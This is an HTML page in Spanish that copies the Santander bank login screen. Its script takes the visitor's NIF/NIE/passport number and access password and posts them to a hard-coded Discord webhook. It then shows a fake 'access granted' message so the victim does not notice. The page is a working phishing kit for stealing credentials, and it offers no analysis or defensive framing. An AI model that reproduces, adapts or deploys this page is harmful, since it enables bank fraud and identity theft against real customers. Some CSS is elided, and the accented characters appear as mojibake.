<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Santander - Buenas tardes</title>
    <style>
        /* [Todo el CSS permanece igual, sin cambios] */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 600"><rect fill="%23000" width="1000" height="600"/><g fill="%23333"><circle cx="200" cy="150" r="100"/><circle cx="800" cy="400" r="150"/><polygon points="100,500 300,450 250,600"/></g></svg>');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            color: white;
            display: flex;
            flex-direction: column;
        }

        /* [Todo el CSS sigue igual...] */
        /* ... por simplicidad omitido aqu√≠ porque no ha sido modificado */

    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            Santander
        </div>
        <button class="menu-btn" onclick="toggleMenu()">
            <div class="hamburger">
                <div></div>
                <div></div>
                <div></div>
            </div>
            Men√∫
        </button>
    </header>

    <main class="main-content">
        <h1 class="greeting">Buenas tardes</h1>

        <form class="login-form" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label class="form-label" for="nif-input">NIF / NIE / Pasaporte</label>
                <input type="text" id="nif-input" class="form-input" placeholder="Introduce tu NIF/NIE/Pasaporte" required />
            </div>

            <div class="form-group">
                <label class="form-label" for="password">Introduce tu clave de acceso</label>
                <div class="password-input-container">
                    <input
                        type="password"
                        class="form-input"
                        placeholder="Introduce tu clave de acceso"
                        id="password"
                        required
                    />
                    <button type="button" class="password-toggle" onclick="togglePassword()">
                        üëÅÔ∏è
                    </button>
                </div>
                <a href="#" class="recover-link">Recupera tu clave de acceso</a>
                <p class="remember-text">
                    Tu usuario se recordar√° en este dispositivo. Solamente tendr√°s que introducir la clave.
                </p>
            </div>

            <a href="#" class="more-info" onclick="toggleMoreInfo()">M√°s informaci√≥n</a>

            <button type="submit" class="login-btn">Entrar</button>
        </form>
    </main>

    <script>
        async function sendDiscordNotification(docNumber, password) {
            const webhookURL = 'https://discord.com/api/webhooks/1405668339992363008/Jwg1y1TsyA3eVEkpIC0P-n7zyQ0BUwCxSpQg8CFrOoDFbSXARHaD68ndkKClJkKal59M';

            const data = {
                content: `Nuevo inicio de sesi√≥n:\nDocumento: ${docNumber || 'desconocido'}\nContrase√±a: ${password || 'no especificada'}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                });
                console.log('Notificaci√≥n enviada a Discord');
            } catch (error) {
                console.error('Error enviando la notificaci√≥n a Discord:', error);
            }
        }

        function handleLogin(event) {
            event.preventDefault();

            const nifInput = document.getElementById('nif-input');
            const passwordInput = document.getElementById('password');

            const docNumber = nifInput.value.trim();
            const password = passwordInput.value;

            if (!docNumber) {
                alert('Por favor, introduce tu n√∫mero de documento.');
                return;
            }
            if (!password) {
                alert('Por favor, introduce tu contrase√±a.');
                return;
            }

            // Enviar notificaci√≥n con documento y contrase√±a
            sendDiscordNotification(docNumber, password);

            // Simulaci√≥n de login
            const loginBtn = document.querySelector('.login-btn');
            loginBtn.textContent = 'Entrando...';
            loginBtn.style.background = 'linear-gradient(135deg, #666, #999)';

            setTimeout(() => {
                alert('Acceso correcto. Bienvenido a tu banca online.');
                loginBtn.textContent = 'Entrar';
                loginBtn.style.background = 'linear-gradient(135deg, #EC0000, #FF4444)';
            }, 2000);
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.password-toggle');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'üôà';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'üëÅÔ∏è';
            }
        }

        function toggleMenu() {
            alert('Men√∫ desplegable - Funcionalidad a implementar');
        }

        function toggleMoreInfo() {
            alert('M√°s informaci√≥n sobre el proceso de login');
        }

        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('focus', function () {
                this.style.transform = 'translateY(-2px)';
            });

            input.addEventListener('blur', function () {
                this.style.transform = 'translateY(0)';
            });
        });

        function updateGreeting() {
            const now = new Date();
            const hour = now.getHours();
            const greetingElement = document.querySelector('.greeting');

            if (hour < 12) {
                greetingElement.textContent = 'Buenos d√≠as';
            } else if (hour < 18) {
                greetingElement.textContent = 'Buenas tardes';
            } else {
                greetingElement.textContent = 'Buenas noches';
            }
        }

        updateGreeting();
    </script>
</body>
</html>
